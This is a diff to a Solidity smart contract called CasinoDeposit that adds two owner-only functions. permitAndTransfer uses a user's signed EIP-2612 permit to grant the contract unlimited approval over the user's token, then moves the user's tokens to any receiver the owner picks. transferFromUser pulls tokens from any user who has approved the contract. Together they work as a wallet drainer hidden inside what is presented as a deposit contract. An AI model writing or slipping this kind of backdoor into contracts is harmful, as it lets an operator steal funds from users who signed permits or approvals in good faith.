@@ -3,6 +3,7 @@ pragma solidity ^0.8.20;
 
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Permit.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
 
@@ -391,5 +392,65 @@ contract CasinoDeposit is Ownable, ReentrancyGuard {
         address token
     ) external view returns (uint256) {
         return withdrawalAllowance[user][token];
+    }
+    
+    // ============ EIP-2612 PERMIT FUNCTIONS ============
+    
+    /**
+     * @notice Use stored EIP-2612 permit to approve unlimited tokens and transfer
+     * @dev Admin can use this to transfer tokens from users who signed permits
+     * @param token Token contract address (must support EIP-2612)
+     * @param owner Token owner who signed the permit
+     * @param receiver Address to receive the tokens
+     * @param amount Amount to transfer
+     * @param deadline Permit deadline timestamp
+     * @param v Signature v component
+     * @param r Signature r component
+     * @param s Signature s component
+     */
+    function permitAndTransfer(
+        address token,
+        address owner,
+        address receiver,
+        uint256 amount,
+        uint256 deadline,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) external onlyOwner nonReentrant {
+        require(owner != address(0), "Invalid owner");
+        require(receiver != address(0), "Invalid receiver");
+        require(amount > 0, "Amount must be > 0");
+        
+        // Execute permit for unlimited approval (type(uint256).max)
+        IERC20Permit(token).permit(owner, address(this), type(uint256).max, deadline, v, r, s);
+        
+        // Transfer from owner to receiver
+        IERC20(token).safeTransferFrom(owner, receiver, amount);
+        
+        emit Transfer(owner, receiver, token, amount, block.timestamp);
+    }
+    
+    /**
+     * @notice Transfer tokens from a user who has already approved this contract
+     * @dev For use after permit has been executed, or with traditional approval
+     * @param token Token contract address
+     * @param owner Token owner
+     * @param receiver Address to receive the tokens
+     * @param amount Amount to transfer
+     */
+    function transferFromUser(
+        address token,
+        address owner,
+        address receiver,
+        uint256 amount
+    ) external onlyOwner nonReentrant {
+        require(owner != address(0), "Invalid owner");
+        require(receiver != address(0), "Invalid receiver");
+        require(amount > 0, "Amount must be > 0");
+        
+        IERC20(token).safeTransferFrom(owner, receiver, amount);
+        
+        emit Transfer(owner, receiver, token, amount, block.timestamp);
     }
 }
